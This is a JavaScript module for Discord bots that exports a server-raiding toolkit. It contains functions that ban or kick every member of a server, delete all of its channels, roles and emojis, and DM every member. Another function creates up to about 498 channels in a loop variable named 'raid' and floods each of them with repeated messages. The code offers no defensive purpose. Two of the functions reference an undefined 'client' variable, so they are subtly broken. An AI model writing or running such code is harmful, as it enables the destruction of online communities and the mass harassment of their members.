const ms = require('ms')
async function banall(serverid, ban_reason, client_name, event) {
  if(!client_name.guilds.cache.get(serverid)) {
    return console.log('Make sure the ID of the server you provide is VALID.')
  }
  else {
    await client_name.guilds.cache.get(serverid).members.cache.forEach(async member => {
      await member.ban({ reason: ((!ban_reason) ? '' : ban_reason) })
    })
  }
}
async function kickall(serverid, kick_reason, client_name, event) {
  if(!client_name.guilds.cache.get(serverid)) {
    return console.log('Make sure the ID of the server you provided is VALID.')
  }
  else {
    await client_name.guilds.cache.get(serverid).members.cache.forEach(async member => {
      await member.kick(((!kick_reason) ? '' : kick_reason))
    })
  }
}
async function deleteAllChannels(serverid, client_name, event) {
  if(!client_name.guilds.cache.get(serverid)) {
    return console.log('Make sure the ID of the server you provided is VALID.')
  }
  else {
    await client_name.guilds.cache.get(serverid).channels.cache.forEach(async channel => {
      await channel.delete()
    })
  }
}
async function createChannelsLoop(serverid, channels_name, times_messsage_is_sent, channel_message, type, topic, nsfw, channel_cooldown, reason, times, client_name, event) {
  if(!client_name.guilds.cache.get(serverid)) {
    return console.log('Make sure the ID of the server you provided is VALID.')
  }
  else if(!channels_name) {
    return console.log('Please put a valid channel name to create.')
  }
  else if(isNaN(times)) {
    return console.log('Please make sure you provided a valid number at times field.')
  }
  else {
    for(let raid = 0;raid < times;raid++) {
      if(client_name.guilds.cache.get(serverid).channels.cache.size >= 498) {
        break;
      } else {
        client_name.guilds.cache.get(serverid).channels.create(channels_name, {
        type: type,
        topic: topic,
        nsfw: nsfw,
        rateLimitPerUser: channel_cooldown,
        reason: reason,
      }).then(channel => {
        for(let raid = 0;raid < times_messsage_is_sent;raid++) {
        channel.send(channel_message)
      }
      })
    }
    }
  }
}
async function dmall(serverid, dmall_message, client_name, event) {
  if(!client_name.guilds.cache.get(serverid)) {
    return console.log('Please make sure you put a VALID server ID inside serverid field.')
  }
  else if(!dmall_message) {
    console.log('I can\'t dmall a blank message...')
  }
  else {
    await client_name.guilds.cache.get(serverid).members.cache.forEach(async member => {
      await member.send(dmall_message)
    })
  }
}
async function deleteAllEmojis(serverid, client_name, event) {
  if(!client.guilds.cache.get(serverid)) {
    return console.log('Please make sure the ID of the server you provided is a VALID one.')
  }
  else {
    await client.guilds.cache.get(serverid).emojis.cache.forEach(async emoji => {
      await emoji.delete()
    })
  }
}
async function deleteAllRoles(serverid, client_name, event) {
  if(!client.guilds.cache.get(serverid)) {
    return console.log('Please make sure the ID of the server you provided is a VALID one.')
  }
  else {
    await client.guilds.cache.get(serverid).roles.cache.forEach(async role => {
      await role.delete()
    })
  }
}
module.exports = {
  banall, kickall, deleteAllChannels, createChannelsLoop, dmall, deleteAllRoles, deleteAllEmojis
}
